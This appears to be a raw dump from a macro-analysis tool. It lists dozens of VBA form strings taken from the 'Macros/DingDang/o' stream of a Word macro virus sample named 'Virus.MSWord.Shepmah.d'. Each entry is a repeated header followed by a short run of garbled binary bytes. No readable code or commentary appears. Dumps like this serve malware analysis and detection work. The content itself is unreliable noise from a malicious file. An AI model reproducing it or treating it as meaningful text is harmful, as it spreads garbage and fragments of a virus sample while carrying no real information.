VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��st�|GYyE��\s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T�7��zk��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V9߀c�N�����$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�)��!G#����>a��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�|6��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yC�9[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��^�s�U]m��`��G��觯�����B��r�"w�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<-�4���d��)�X�2~q�S�"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���6bQ@^(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���2P��ֹ�5GZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����o�`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PJ���<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F0�9�9�a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qMYޠ!:���Y%+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@�H@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z��)���40N6�2�+��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�uhi�<�+!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ��y�0���8*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B��#��X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����h�fA��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�פM �1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���s�#6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OxX��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`�Z0Y�p�B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'{G����$��y��Oi.47��ci*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�rԁ�z�G*���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�#CQ4�(�Ј��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�m@�z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ڣ�k��[Y\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*���LԣM���8恳w��!�hҍ:Őr�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p�#<e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
ZhI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'x�'�
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�E��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�C_��/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�A����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��/��,o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0�<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��B�p�|R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ϳ�i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Vb�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/\Î~$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<-���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:�Øg�-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w,홉�	4�)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l(\�ɇK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,D�i'��`�=�Վ�ci��Ƿ�1F�ȩ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ںz
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f��[Ё
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��H8��6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Gx��;�e$<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8�Փ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ȅ�\�N߄�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��q&�2D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�*ϩ�o�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�@���f�pdwt�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�V��jF��'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c��v�sL'5%LfÇ6�Q��eC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��_#\d�{�c=M1�=Z���c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n���L�*[��XβrZa�A �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�( 0���mp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�e4�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>t<g|��57+��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���jY"ވC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�_&
x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�g)7V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&2������(S�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�(П
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"T!��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���M�Ǧ�r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0{��!a�!>B����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P���9

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��y]u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��H�rĄ�o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e�S)נ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x-.��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c��Bl
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
˰sk"��,G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
we�.�[ʡ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�e���P	��v��v���`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Kup"9r$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;f��u�-�/a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y��%J��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��M��ǀ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a�|�bG�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�Ԏ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Cz
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q������U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(�f�2t�|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+�I�$jȈ�����<`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��4�&/P6��$���f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Hv$Z~#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F[Q���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�vsM`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+��7��D��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!H�=�(��l�43��7�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ݡ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.l$�Щ"Y�@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I8�6��XqDPEE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1}��48*��l�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}f�:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2pA�dߥA�`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
),o]�iY�f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Xx�ýP�4tT+-8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.��"��m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5Ls$�G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��w�s(�g 1�.�p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�o��2b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XS#�T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GRLq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
aZL3s��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p
�Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N"+I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q
� o�1��u�`	��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&�[meO
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W9�p7R�~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nx�uc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JqS���T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I&`�0���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���#p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�~��G��OT��A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r&Ɨ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��/=E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8�Shs��0
